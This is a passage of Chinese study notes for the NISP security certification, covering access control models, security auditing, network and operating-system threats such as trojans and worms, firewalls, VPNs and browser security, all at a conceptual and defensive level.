title="主体与客体"></a>主体与客体</h5><p>主体：</p><p>发起者，是一个主动的实体，可以操作被动实体的相关信息或数据<br>用户、程序、进程等</p><p>客体：</p><p>一种被动实体，被操作的对象，规定需要保护的资源<br>文件、存储介质、程序、进程等</p><p>主体∶接收客体相关信息和数据，也可能改变客体相关信息<br>一个主体为了完成任务，可以创建另外的主体，这些子主体可以在网络上不同的计算机上运行，并由父主体控制它们</p><p>客体∶始终是提供、驻留信息或数据的实体  </p><p>主体和客体的关系是相对的，角色可以互换</p><h5 id="控制策略"><a href="#控制策略" class="headerlink" title="控制策略"></a>控制策略</h5><p>是主体对客体的相关访问规则集合，即属性集合。访问策略体现了一种授权行为，也是客体对主体某些操作行为的默认。</p><p>访问控制是主体依据某些控制策略或访问权限，对客体本身或其资源赋予不同访问权限的能力，从而保障数据资源在合法范围内得以有效使用和管理。</p><p>访问控制安全策略实施遵循最小特权原则。在主体执行操作时，按照主体所需权利的最小化原则分配给主体权力。最大限度地限制主体实施授权行为，避免突发事件、操作错误和未授权主体等意外情况可能给系统造成的危险。</p><h5 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h5><p>规定主体可以对客体执行的操作∶</p><p>读、写、执行、拒绝访问</p><h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><h5 id="自主访问控制"><a href="#自主访问控制" class="headerlink" title="自主访问控制"></a>自主访问控制</h5><p>自主访问控制(Discretionary Access Control.DAC)是一种广泛应用的访问控制方法。采用这种方法，资源的所有者(往往也是创建者)可以规定谁有权访问他们的资源，用户(或用户进程)可以选择与其他用户共享资源</p><h6 id="访问控制矩阵"><a href="#访问控制矩阵" class="headerlink" title="访问控制矩阵"></a>访问控制矩阵</h6><p>矩阵元素︰规定了相应用户对应于相应的文件被准予的访问许可</p><p><img src="/2022/02/10/NISP/2.4-1.png"></p><p>优点：  </p><p>根据主体的身份和访问权限进行决策<br>具有某种访问能力的主体能够自主地将访问权的某个子集授予其它主体<br>灵活性高，被大量采用  </p><p>缺点：</p><p>信息在传递过程中其访问权限关系会被改变</p><h5 id="强制访问控制"><a href="#强制访问控制" class="headerlink" title="强制访问控制"></a>强制访问控制</h5><p>强制访问控制(Mandatory Access Con往01 ，MAC)是指主体和客体都有一个固定的安全属性，系统用该安全属性来决定一个主体是否可以访问某个客体。如果系统认为具有某一个安全属性的主体不适合访问某个客体，那么任何其他主体都无法使该主体具有访问该客体的权利</p><p>主体和客体分配有一个安全属性<br>应用于军事等安全要求较高的系统<br>可与自主访问控制结合使用 </p><h5 id="自主访问控制与强制访问控制的比较"><a href="#自主访问控制与强制访问控制的比较" class="headerlink" title="自主访问控制与强制访问控制的比较"></a>自主访问控制与强制访问控制的比较</h5><p><img src="/2022/02/10/NISP/2.4-2.png"></p><h5 id="基于角色的访问控制-RBAC"><a href="#基于角色的访问控制-RBAC" class="headerlink" title="基于角色的访问控制 (RBAC)"></a>基于角色的访问控制 (RBAC)</h5><p>RBAC的基本思想是根据用户所担任的角色来决定用户在系统中的访问权限。</p><p>一个用户必须扮演某种角色，而且还必须激活这一角色，才能对一个对象进行访问或执行某种操作。</p><p><img src="/2022/02/10/NISP/2.4-3.png"></p><p>特点：  </p><p>便于授权管理（角色的变动远远低于个体的变动)<br>便于处理工作分级，如文件等资源分级管理<br>利用安全约束，容易实现各种安全策略，如最小特权、职责分离等<br>便于任务分担，不同角色完成不同的任务</p><h5 id="什么是访问控制"><a href="#什么是访问控制" class="headerlink" title="什么是访问控制"></a>什么是访问控制</h5><p>在信息系统中，访问控制是为了在系统资源提供最大限度的基础上，对用户的访问权限进行管理，防止对信息的非授权管理和滥用</p><h5 id="访问控制的目的是什么"><a href="#访问控制的目的是什么" class="headerlink" title="访问控制的目的是什么"></a>访问控制的目的是什么</h5><p>对经过身份验证后的合法用户，提供所需要的经过授权的服务，拒绝非法用于越权的服务请求，同时拒绝非法用户非法授权的请求，保证用户在系统安全策略下安全的工作</p><h3 id="2-5-安全审计"><a href="#2-5-安全审计" class="headerlink" title="2.5 安全审计"></a>2.5 安全审计</h3><p>即便是采取了很多方法来保障计算机或网络安全，但仍然不可避免系统感染病毒或数据安全受到威胁。受到威胁后，如何从安全事故中恢复过来，使系统尽快运作起来，需要预先采取一些措施。安全审计是提高安全性的重要工具，它能够再现问题，以帮助事后的责任追查和数据恢复等</p><p>审计技术的出现早于计算机技术，它按照时间顺序产生、记录系统事牛，并对其进行检查。安全审计可以跟踪和监测系统中的异常事件，也可以监视系统中其他安全机制的运行情况</p><h5 id="计算机安全审计"><a href="#计算机安全审计" class="headerlink" title="计算机安全审计"></a>计算机安全审计</h5><p>计算机安全审计(Audit)是指按照一定的安全策略，记录历史操作事件，并利用记录进行分析，发现系统漏洞、入侵行为等，并改善系统性能和安全性的一系列过程。安全审计是对访问控制的必要补充，它会对用户使用何种信息资源、使用的时间，以及如何使用(执行何种操作)进行记录与监控。通过对系统和用户进行充分和适当的审计，能够分析发现安全事件的原因，并提供相应的证据</p><h5 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h5><p>日志是安全审计系统的主要组成部分。为了维护自身系统资源的运行状况，计算机系统一般都会有相应的日志系统，记录有关日常事件或者误操作警报的日期及时间</p><p>受到可疑攻击或安全威胁后，可以通过查看事件安全日志来确认可疑或恶意的行为。例如，通过查看事件日志，发现非工作时间某个用户成功登录账户，则可能有人窃取了账号和口令:日志中有多次登录失败的记录则可能有攻击者尝试进入系统</p><h5 id="主动-被动审计"><a href="#主动-被动审计" class="headerlink" title="主动/被动审计"></a>主动/被动审计</h5><p>安全审计可以分成被动式审计、主动式审计两种。</p><p>被动式审计就是简单地记录一些活动，并不做处理。</p><p>主动式审计一般包括:结束一个登录会话、拒绝一些主机的访问(包括WEB站点，FTP(File Transfer Protocol，文件传输协议)服务器和电子邮件服务器)、跟踪非法活动的源位置等行为。</p><h5 id="安全审计的作用"><a href="#安全审计的作用" class="headerlink" title="安全审计的作用"></a>安全审计的作用</h5><p>(1)威慑和警告潜在的攻击者和滥用授权的合法用户。如果系统使用者知道他们的行为活动被记录在审计日志中，相应人员需要为自己的行为负责，他们就会审慎自己的行为，不太会违反安全策略和绕过安全控制措施</p><p>(2)提供有价值的系统使用日志，帮助系统管理员及时发现系统入侵行为或潜在的系统漏洞。对审计的每一次记录进行分析，可实时发现或预防、检测入侵活动。实时入侵检测审计能及时发现非法授权者对系统的访问，也可以探测到病毒活动和网络攻击</p><p>(3)在发生故障后，可以帮助评估故障损失、重建事件和数据恢复。通过审查系统活动，可以比较容易地评估故障损失，确定故障发生的时间、原因和过程。通过对审计日志进行分析可以帮助重建系统或事件，也能协助恢复数据文件。同时，还有助于避免再次发生此类故障</p><p>(4)对系统控制、安全策略与规程中特定的改变做出评价和反馈，便于修订决策和部署</p><h5 id="什么是安全审计"><a href="#什么是安全审计" class="headerlink" title="什么是安全审计"></a>什么是安全审计</h5><p>按照一定的安全策略，记录历史操作事件，并利用记录进行分析，发现系统漏洞、入侵行为等，并改善系统安全性的一系列的过程，是对访问控制的必要补充，对用户行为的记录和监控，通过对用户、系统行为进行审计，提供相应的安全事件的原因，并提供相应的证据</p><h2 id="第三章-网络安全防护技术"><a href="#第三章-网络安全防护技术" class="headerlink" title="第三章 网络安全防护技术"></a>第三章 网络安全防护技术</h2><h3 id="3-1-网络基础知识"><a href="#3-1-网络基础知识" class="headerlink" title="3.1 网络基础知识"></a>3.1 网络基础知识</h3><h5 id="Internet和TCP-IP协议"><a href="#Internet和TCP-IP协议" class="headerlink" title="Internet和TCP/IP协议"></a>Internet和TCP/IP协议</h5><p>因特网( Internet )通过TCP/IP协议将遍布在全世界各地的计算机互联，从而形成超级计算机网络。</p><h5 id="网络协议模型"><a href="#网络协议模型" class="headerlink" title="网络协议模型"></a>网络协议模型</h5><p><img src="/2022/02/10/NISP/3.1-1.png"></p><p><img src="/2022/02/10/NISP/3.1-2.png"></p><h5 id="计算机网络基础…"><a href="#计算机网络基础…" class="headerlink" title="计算机网络基础….."></a>计算机网络基础…..</h5><p>（这个就不写在这了）</p><h3 id="3-2-网络安全威胁"><a href="#3-2-网络安全威胁" class="headerlink" title="3.2 网络安全威胁"></a>3.2 网络安全威胁</h3><p>——网络安全威胁主要来自攻击者对网络及信息系统的攻击。</p><p>——网络嗅探、网络钓鱼、拒绝服务、远程控制、社会工程学</p><p>——网络攻击手段，获得目标计算机的控制权，或获取有价值的数据和信息等。</p><h5 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h5><p>网络嗅探是通过截获、分析网络中传输的数据而获取有用信息的行为。</p><p>BurpSuite WireShark…</p><h5 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h5><p>网络钓鱼是指攻击者利用伪造的网站或欺骗性的电子邮件进行的网络诈骗活动。</p><p>常用手段：</p><p>1.伪造相似域名的网站<br>2.显示IP地址而非域名<br>3.超链接欺骗<br>4.弹出窗口欺骗  </p><h5 id="拒绝服务攻击Dos"><a href="#拒绝服务攻击Dos" class="headerlink" title="拒绝服务攻击Dos"></a>拒绝服务攻击Dos</h5><p>攻击者通过各种非法手段，占据大量的服务器资源，致使服务系统没有其他资源为合法用户提供服务，进而造成合法用户无法访问资源的攻击方式。严重时，导致服务器瘫痪</p><p>1.拒绝服务攻击(Denial of Services , DoS )<br>2.分布式拒绝服务攻击(Distributed Denial of Services，DDoS )<br>3.同步泛洪攻击( Synchronizeflooding , SYN flooding )</p><h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><p>攻击者通过各种非法手段成功入侵目标主机后，以实现对目标主机的远程控制。</p><h5 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h5><p>社会工程学( Social Engineering ,SE )不是一门科学，而是一门综合运用信息收集，语言技巧、心理陷阱等多种手段，完成欺骗目的的方法。  </p><p>社会工程学的概念是由凯文.米特尼克在其著作的《欺骗的艺术》一书中首次提出</p><h5 id="第一个黑客-凯文-米特尼克"><a href="#第一个黑客-凯文-米特尼克" class="headerlink" title="第一个黑客 凯文.米特尼克"></a>第一个黑客 凯文.米特尼克</h5><p>第一个因入侵计算机系统入狱</p><h3 id="3-3-网络安全防护与实践"><a href="#3-3-网络安全防护与实践" class="headerlink" title="3.3 网络安全防护与实践"></a>3.3 网络安全防护与实践</h3><h5 id="虚拟专用网络VPN"><a href="#虚拟专用网络VPN" class="headerlink" title="虚拟专用网络VPN"></a>虚拟专用网络VPN</h5><p>虚拟专用网络(Virtual Private Network ，VPN)是在公用网络上建立专用网络的技术。</p><p>如：一家遍布世界各地的跨国企业建立企业内部私有网络</p><p>VPN的特点</p><p>1.成本低<br>2.安全性高<br>3.服务质量保证<br>4.可管理性<br>5.可扩展性  </p><p>VPN常用协议</p><p>IPSec协议、安全套接层协议SSL</p><p>VPN的应用</p><p>1.远程访问VPN，适用于企业内部人员流动频繁或远程办公的情况<br>2.内联网VPN，适用于相同企业内部异地互联的情况<br>3.外联网VPN，适用于不同企业之间互联的情况</p><h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><p>计算机网络中所说的防火墙，是指设置在不同网络(如:可信任的内网和外网或专用网与不可信的共用网)之间的一系列包括软硬件;在内的部件组合。它在内网和外网之间构建一道保护屏障，网络内部和外部之间的所有数据流必须经过防火墙，只有符合安全标准的数据流才能通过防火墙。</p><p>防火墙的功能</p><p>1.数据包过滤<br>2.审计和报警机制<br>3.远程管理<br>4.网络地址转换<br>5.代理<br>6.流量控制、统计分析和流量计费  </p><h3 id="3-4-无线局域网安全防护"><a href="#3-4-无线局域网安全防护" class="headerlink" title="3.4 无线局域网安全防护"></a>3.4 无线局域网安全防护</h3><h5 id="无线局域网安全防护概述"><a href="#无线局域网安全防护概述" class="headerlink" title="无线局域网安全防护概述"></a>无线局域网安全防护概述</h5><p>无线局域网(Wireless Local Area Networks, WLAN)技术可以非常使捷的以无线方式连接网络设备，相对于有线局域网它具有许多优点，如人们可以随时随地的访问网络资源。</p><h5 id="增强无线网络安全性的措施"><a href="#增强无线网络安全性的措施" class="headerlink" title="增强无线网络安全性的措施"></a>增强无线网络安全性的措施</h5><p>1.修改admin密码<br>2.使用无线网络安全协议<br>3.禁用DHCP服务<br>4.禁止SSID广播<br>5.禁止远程管理<br>6.MAC地址过滤<br>7.合理放置无线AP</p><h3 id="3-5-相关实验"><a href="#3-5-相关实验" class="headerlink" title="3.5 相关实验"></a>3.5 相关实验</h3><h5 id="网络管理基本命令"><a href="#网络管理基本命令" class="headerlink" title="网络管理基本命令"></a>网络管理基本命令</h5><p><img src="/2022/02/10/NISP/3.5-1.png"></p><p><img src="/2022/02/10/NISP/3.5-2.png"></p><p><img src="/2022/02/10/NISP/3.5-3.png"></p><h5 id="无线局域网安全配置"><a href="#无线局域网安全配置" class="headerlink" title="无线局域网安全配置"></a>无线局域网安全配置</h5><p><img src="/2022/02/10/NISP/3.5-4.png"></p><h2 id="第四章-操作系统安全防护技术"><a href="#第四章-操作系统安全防护技术" class="headerlink" title="第四章 操作系统安全防护技术"></a>第四章 操作系统安全防护技术</h2><h3 id="4-1-操作系统概述"><a href="#4-1-操作系统概述" class="headerlink" title="4.1 操作系统概述"></a>4.1 操作系统概述</h3><p>世界上第一台计算机诞生于1946年<br>20世纪70年代中期开始出现了计算机操作系统</p><h5 id="操作系统的位置"><a href="#操作系统的位置" class="headerlink" title="操作系统的位置"></a>操作系统的位置</h5><p>面向系统资源<br>——操作系统必须尽可能提高资源利用率  </p><p>面向用户<br>——操作系统必须提供方便易用的用户界面  </p><p><img src="/2022/02/10/NISP/4.1-1.png"></p><h5 id="操作系统的定义"><a href="#操作系统的定义" class="headerlink" title="操作系统的定义"></a>操作系统的定义</h5><p>一组控制和管理计算机硬件和软件资源<br>合理地对各类作业进行调度以及方便用户的程序集合直接运行在“裸机”上的最基本的系统软件<br>其他任何软件都必须在操作系统的支持下才能运行  </p><p>可以说操作系统是连接用户和计算机硬件的接口。</p><h5 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h5><p>并发、共享、虚拟、异步</p><h5 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h5><p>管理系统中的各种资源</p><p>CPU管理、存储管理、设备管理、文件管理、网络与通信管理</p><p>为用户提供良好的界面</p><p>操作系统为用户提供了两种接口∶<br>1.作业控制级接口<br>——联机用户接口<br>——脱机用户接口<br>⒉程序级接口</p><h5 id="操作系统的分类"><a href="#操作系统的分类" class="headerlink" title="操作系统的分类"></a>操作系统的分类</h5><p>按机型分∶大型机、中、小型和微型机<br>按用户数目分∶单用户操作系统和多用户操作系统<br>按功能特征分︰批处理操作系统、实时操作系统、分时操作系统<br>按应用领域划分主要有三种∶桌面操作系统、服务器操作系统和嵌入式操作系统</p><p>按应用领域划分：<br>桌面操作系统  </p><ul><li>Mac oS x、Linux发行版、Windows XP ，Windows Vista ，Windows 7 , Windows 8、Windows 10<br>服务器操作系统  </li><li>Unix系列:IBM-AIX，HP-UX  </li><li>Linux系列: Red Hat Linux ,CentOs ，Ubuntu  </li><li>Windows系列: Windows Server 2003 ,Windows Server2008，Windows Server 2008 R2<br>嵌入式操作系统  </li><li>Android、iOs、Symbian、Windows Phone和BlackBerry os</li></ul><h3 id="4-2-操作系统的安全威胁"><a href="#4-2-操作系统的安全威胁" class="headerlink" title="4.2 操作系统的安全威胁"></a>4.2 操作系统的安全威胁</h3><p>漏洞威胁、恶意代码威胁、端口扫描威胁</p><h5 id="漏洞威胁"><a href="#漏洞威胁" class="headerlink" title="漏洞威胁"></a>漏洞威胁</h5><h5 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h5><p>系统漏洞，也可以称为系统脆弱性，是指计算机系统在硬件、软件、协议的设计、具体实现以及系统安全策略上存在的缺陷和不足。</p><p>漏洞的特性</p><p>1.漏洞的事件局限性<br>⒉漏洞的广泛性<br>3.漏洞的隐蔽性<br>4.漏洞的被发现性  </p><p>漏洞产生的原因</p><p>1、程序逻辑结构设计不合理，不严谨<br>2、除了程序逻辑结构设计漏洞之外，程序设计错误漏洞也是一个重要因素<br>3、由于目前硬件无法解决特定的问题，使编程人员只得通过软件设计来表现出硬件功能而产生的漏洞</p><p>漏洞的生命周期</p><p>漏洞生命周期的定义︰漏洞从客观存在到被发现、利用，到大规模危害和逐渐消失，这期间存在一个生命周期，概周期被称为漏洞生命周期</p><p><img src="/2022/02/10/NISP/4.2-1.png"></p><p>系统漏洞的防范</p><p>1.提升防火墙技术<br>2.加强病毒防范措施<br>3.注重漏洞扫描技术的应用<br>4.强化端口解析以及加强数据备份工作   </p><p>漏洞扫描</p><p>漏洞扫描是对计算机系统或其他网络设备进行相关检测，找出安全隐患和可以被攻击者利用的漏洞。 </p><p>漏洞扫描的必要性</p><p>防火墙的局限性和脆弱性<br>针对IDS的逃避技术<br>网络隐患扫描系统浮出水面  </p><p>扫描工具的选择</p><p>1、漏洞库中的漏洞数量<br>2、扫描工具的易用性<br>3、是否可以生成漏洞报告<br>4、对于漏洞修复行为的分析和建议<br>5、安全性<br>6、工具的性能及价格  </p><h5 id="恶意代码威胁"><a href="#恶意代码威胁" class="headerlink" title="恶意代码威胁"></a>恶意代码威胁</h5><p>恶意代码的定义</p><p>恶意代码(Unwanted Code )是指故意编制或设置的、对网络或系统会产生威胁或潜在威胁的计算机代码。</p><p>恶意代码的攻击机制</p><p><img src="/2022/02/10/NISP/4.2-2.png"></p><p>常见的恶意代码</p><p>病毒、木马、蠕虫</p><h5 id="计算机病毒-Computer-Virus-CV"><a href="#计算机病毒-Computer-Virus-CV" class="headerlink" title="计算机病毒( Computer Virus,CV )"></a>计算机病毒( Computer Virus,CV )</h5><p>指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码</p><p>计算机病毒的特性</p><p>寄生性、传染性、潜伏性、隐蔽性、破坏性、可触发性</p><p>计算机病毒的危害</p><p>1、破坏操作系统的处理器管理功能<br>2、破坏操作系统的文件管理功能<br>3、破坏操作系统的存储管理功能<br>4、直接破坏计算机系统的硬件功能</p><p>计算机病毒的表现</p><p>机器不能正常启动<br>运行速度降低<br>内存空间迅速减小<br>文件内容和长度有所改变<br>经常出现“死机”现象<br>外部设备工作异常  </p><p>计算机病毒的传播途径</p><p>电脑的硬件设备、移动存储设备、计算机网络</p><p>计算机病毒的防范</p><p>1.建立良好的安全习惯<br>2.关闭或删除系统中不需要的服务<br>3.经常升级安全补丁<br>4.使用复杂的密码<br>5.迅速隔离受感染的计算机<br>6.了解一些病毒知识<br>7.最好安装专业的杀毒软件进行全面监控<br>8.用户还应该安装个人防火墙软件进行防黑<br>9.安全管理类软件</p><h5 id="计算机木马"><a href="#计算机木马" class="headerlink" title="计算机木马"></a>计算机木马</h5><p>木马(Trojan )一词来源于希腊神话“特洛伊木马”，在计算机领域延伸为利用计算机程序漏洞侵入后窃取他人文件、财产与隐私的程序称为木马。计算机木马是一种后门程序，常被黑客用作控制远程计算机的工具。</p><p>木马的组成</p><p>一个完整的木马系统是由硬件部分、软件部分和具体连接部分组成<br>1.硬件部分<br>建立木马连接所必须的硬件实体<br>2.软件部分<br>实现远程控制所必须的软件程序<br>3.具体连接部分<br>通过INTERNET在服务端和控制端之间建立一条木马通道所必须的元素</p><p>木马的传播</p><p>1、通过电子邮件的附件传播<br>2、通过下载文件传播<br>3、通过网页传播<br>4、通过聊天工具传播</p><p>木马的种类</p><p>1.网络游戏木马<br>2.网银木马<br>3.即时通讯软件木马<br>4.网页点击类木马<br>5.下载类木马<br>6.代理类木马<br>7、隐藏类木马<br>8、FTP木马</p><p>木马的危害</p><p>1、盗取我们的网游账号，威胁我们的虚拟财产的安全<br>2、盗取我们的网银信息，威胁我们的真实财产的安全<br>3、利用即时通讯软件盗取我们的身份，传播木马病毒<br>4、给我们的电脑打开后门，使我们的电脑可能被黑客控制</p><p>防治木马的措施</p><p>第一，安装杀毒软件和个人防火墙，并及时升级<br>第二，把个人防火墙设置好安全等级，防止未知程序向外传送数据<br>第三，可以考虑使用安全性比较好的浏览器和电子邮件客户端工具<br>第四，如果使用IE浏览器，应该安装安全浏览器，防止恶意网站在自己电脑上安装不明软件和浏览器插件，以免被木马趁机侵入</p><h5 id="蠕虫-Wrom"><a href="#蠕虫-Wrom" class="headerlink" title="蠕虫(Wrom)"></a>蠕虫(Wrom)</h5><p>蠕虫病毒是一种常见的计算机病毒。它是利用网络进行复制和传播，传染途径是通过网络和电子邮件。</p><p>蠕虫病毒和普通病毒的区别</p><p><img src="/2022/02/10/NISP/4.2-3.png"></p><p>蠕虫的基本程序结构</p><p>传播模块∶负责蠕虫的传播<br>传播模块又可以分为三个基本模块∶扫描模块、攻击模块和复制模块  </p><p>隐藏模块∶侵入主机后，隐藏蠕虫程序，防止被用户发现。  </p><p>目的功能模块∶实现对计算机的控制、监视或破坏等功能。</p><p>蠕虫的传播过程</p><p>扫描︰由蠕虫的扫描功能模块负责探测存在漏洞的主机。当程序向某个主机发送探测漏洞的信息并收到成功的反馈信息后，就得到一个可传播的对象</p><p>攻击:攻击模块按漏洞攻击步骤自动攻击步骤1中找到的对象，取得该主机的权限（一般为管理员权限），获得一个shell</p><p>复制∶复制模块通过原主机和新主机的交互将蠕虫程序复制到新主机并启动</p><p>蠕虫病毒的特点</p><p>1、较强的独立性<br>2、利用漏洞主动攻击<br>3、传播更快更广</p><p>蠕虫病毒的防范</p><p>1、安装正版杀毒软件、个人防火墙等，并及时升级，上网时打开杀毒软件实时监控功能<br>2、使用“安全漏洞扫描”软件，弥补操作系统和应用程序的漏洞<br>3、不浏览不良网站，不随意下载安装可疑插件<br>4、不接收QQ、MSN、E-mail等传来的可疑文件和连接</p><h5 id="端口扫描威胁"><a href="#端口扫描威胁" class="headerlink" title="端口扫描威胁"></a>端口扫描威胁</h5><p>端口扫描通常指对目标计算机的所有端口发送同一信息，然后根据返回端口状态来分析目标计算机的端口是否打开或可用</p><p>端口扫描的目的</p><p>1.判断目标主机上开放了哪些服务<br>2.判断目标主机的操作系统</p><p>扫描器</p><p>扫描器是一种自动检测远程或本地主机安全性弱点的程序，通过使用扫描器你可一不留痕迹的发现远程服务器的各种TCP端口的分配及提供的服务和它们的软件版本!这就能让我们间接的或直观的了解到远程主机所存在的安全问题</p><p>为什么需要扫描器</p><p>1、由于网络技术的飞速发展，网络规模迅速增长和计算机系统日益复杂，导致新的系统漏洞层出不穷<br>2、由于系统管理员的疏忽或缺乏经验，导致有的漏洞依然存在<br>3、许多人出于好奇或别有用心，不停地窥视网上资源</p><p>扫描器的功能</p><p>1、扫描目标主机识别其工作状态（开/关机)<br>2、识别目标主机端口的状态（监听/关闭)<br>3、识别目标主机系统及服务程序的类型和版本<br>4、根据已知漏洞信息，分析系统脆弱点<br>5、生成扫描结果报告</p><h5 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h5><p>常见的服务端口有哪些?  </p><p>HTTP是80;FTP是21;TELNET是23;远程桌面是3389等等。</p><p>根据木马特点，如何应对木马攻击?</p><p>木马的检测和查杀，除了依靠杀毒软件和安全防护软件等常用手段外。还可以通过全面检测系统的注册表、文件、网络连接、运行的进程等实现人工的分析。</p><h3 id="4-3-操作系统安全防护"><a href="#4-3-操作系统安全防护" class="headerlink" title="4.3 操作系统安全防护"></a>4.3 操作系统安全防护</h3><h5 id="安全防护策略"><a href="#安全防护策略" class="headerlink" title="安全防护策略"></a>安全防护策略</h5><p>制定操作系统安全策略<br>关闭不必要的服务<br>关闭不必要的端口<br>开启审核策略<br>开启密码策略</p><h5 id="补丁程序"><a href="#补丁程序" class="headerlink" title="补丁程序"></a>补丁程序</h5><p>分类</p><p>一，“高危漏洞”的补丁<br>二，软件安全更新的补丁<br>三，可选的高危漏洞补丁<br>四，其他及功能性更新补丁<br>五，无效补丁</p><h5 id="终端防护软件"><a href="#终端防护软件" class="headerlink" title="终端防护软件"></a>终端防护软件</h5><p>这里所说的防护软件一般是指计算机病毒防护软件。也就是我们常说的病毒防护软件或者杀毒软件</p><p>终端防护软件的一些常识</p><p>1.杀毒软件不可能查杀所有病毒<br>⒉.杀毒软件能查到的病毒，不一定能杀掉<br>3.一台电脑每个操作系统下不必同时安装两套或两套以上的杀毒软件<br>4.杀毒软件对被感染的文件杀毒有多种方式∶1清除，2删除，3禁止访问，4隔离，5不处理</p><h5 id="个人防火墙-Personal-FireWall-，PFW"><a href="#个人防火墙-Personal-FireWall-，PFW" class="headerlink" title="个人防火墙(Personal FireWall ，PFW)"></a>个人防火墙(Personal FireWall ，PFW)</h5><p>不需要特定的网络设备，用户在计算机上安装即可，可以设置特定的规则组织来自外部网络的攻击保护操作系统的安全  </p><p>通俗的讲，个人电脑上的带网络防护的杀毒软件、个人防火墙软件、windows或linux系统自带的防火墙，都算是个人防火墙</p><p>防火墙的功能</p><p>能过滤不安全的服务和非法用户,防止未授权的用户访问内部网络<br>能控制对内部网络的访问权，根据用户的安全策略，允许内部网络的一部分主机被外部网络访问，而另一部分被很好地保护<br>能对网络安全进行监控</p><p>防火墙的分类</p><p>按构件的性质<br>可以分为软件、硬件和芯片级防火墙三类</p><p>按被应用部署的位置<br>可以分为边界、个人和混合防火墙三类</p><p>按性能<br>可以分为百兆级和千兆级防火墙两类</p><p>按采用的技术<br>可以分为包过滤、状态检测和应用代理三类</p><h5 id="相关问题-1"><a href="#相关问题-1" class="headerlink" title="相关问题"></a>相关问题</h5><p>简述个人防火墙的优缺点  </p><p>优点∶成本低，不需要额外的硬件源，可以抵挡内部的攻击<br>缺点:个人防火墙主要的缺点是对公共网络只有一个物理接口，个人防火墙本身可能会容易受到威胁</p><h3 id="4-4-相关实验"><a href="#4-4-相关实验" class="headerlink" title="4.4 相关实验"></a>4.4 相关实验</h3><p><img src="/2022/02/10/NISP/4.4-1.png"></p><p>（同Linux系统命令设置）</p><h2 id="第五章-应用与数据安全"><a href="#第五章-应用与数据安全" class="headerlink" title="第五章 应用与数据安全"></a>第五章 应用与数据安全</h2><h3 id="5-1-浏览器安全"><a href="#5-1-浏览器安全" class="headerlink" title="5.1 浏览器安全"></a>5.1 浏览器安全</h3><h5 id="服务器端和客户端"><a href="#服务器端和客户端" class="headerlink" title="服务器端和客户端"></a>服务器端和客户端</h5><p>服务器端、客户端</p><h5 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C/S架构"></a>C/S架构</h5><p>客户端/服务器结构(Client/Server，简称为C/S结构)是一种软件系统的体系结构。</p><p>此结构中客户端程序和服务器端程序通常分布于两台计算机上，客户端程序的任务是将用户的要求提交给服务器端程序，再将服务器端程序返回的结果以特定的形式显示给用户。</p><p>服务器端程序的任务是接收客户端程序提出的服务请求，并进行相应的处理，再将结果返回给客户端程序。</p><h5 id="B-S架构"><a href="#B-S架构" class="headerlink" title="B/S架构"></a>B/S架构</h5><p>浏览器/服务器结构(Browser/Server，简称为B/S结构）中终端用户不需要安装专门的软件，只需要安装浏览器即可。</p><p>这种结构将系统功能的核心部分集中到服务器上。</p><h5 id="浏览器安全措施"><a href="#浏览器安全措施" class="headerlink" title="浏览器安全措施"></a>浏览器安全措施</h5><p>删除和管理Cookies、删除浏览器历史纪录、禁用ActiveX控件</p><h6 id="删除和管理Cookies"><a href="#删除和管理Cookies" class="headerlink" title="删除和管理Cookies"></a>删除和管理Cookies</h6><p>Cookie是指网站放置在个人计算机上的小文件，用于存储用户信息和用户偏好的资料。Cookie可以记录用户访问某个网站的账户和口令，从而避免每次访问网站时都需要使用输入账户和口令登录</p><p>Cookie给用户访问网站带来便利的同时，也存在一些安全隐患。因为Cookie中保存的信息中常含有一些个人隐私信息，如果攻击者获取这些Cookie信息，就会危及个人隐私安全。所以在公用计算机上使用浏览器后需删除Cookie信息</p><h6 id="删除浏览器历史纪录"><a href="#删除浏览器历史纪录" class="headerlink" title="删除浏览器历史纪录"></a>删除浏览器历史纪录</h6><p>浏览历史记录是在用户浏览网页时，由浏览器记住并存储在计算机中的信息</p><p>这些信息包括输入表单的信息、口令和访问的网站等，方便用户再次使用浏览器访问网站  </p><p>如果用户使用公用计算机上网，而且不想让浏览器记住用户的浏览数据，用户可以有选择地删除浏览器历史记录</p><h6 id="禁用ActiveX控件"><a href="#禁用ActiveX控件" class="headerlink" title="禁用ActiveX控件"></a>禁用ActiveX控件</h6><p>ActiveX控件是一些嵌入在网页中的小程序，网站可以使用这类小程序提供视频和游戏等内容  </p><p>浏览网站服务器时，用户还可以使用这些小程序与工具栏和股票行情等内容进行交互  </p><p>但是，ActiveX控件会导致一些安全隐患，攻击者可以使用ActiveX控件向用户提供不需要的服务  </p><p>某些情况下，这些程序还可以用来收集用户计算机的个人信息、破坏计算机的信息，或者在未获取用户同意的情况下安装恶意软件  </p><h5 id="相关问题-2"><a href="#相关问题-2" class="headerlink" title="相关问题"></a>相关问题</h5><p>C/S模式和B/S模式的区别是什么?</p><p>C/S模式就是客户端(client)/服务器(server)模式，客户端的电脑也可以参与整个系统的事务处理，可以处理一些不需要服务器处理的事务<br>B/S模式就是浏览器(brower)/服务器(server)模式，浏览器端只能通过浏览程序（I正E等）访问服务器，显示服务器提供的信息，整个系统的事务处理都要由服务器来完成</p><h3 id="5-2-网络金融交易安全"><a href="#5-2-网络金融交易安全" class="headerlink" title="5.2 网络金融交易安全"></a>5.2 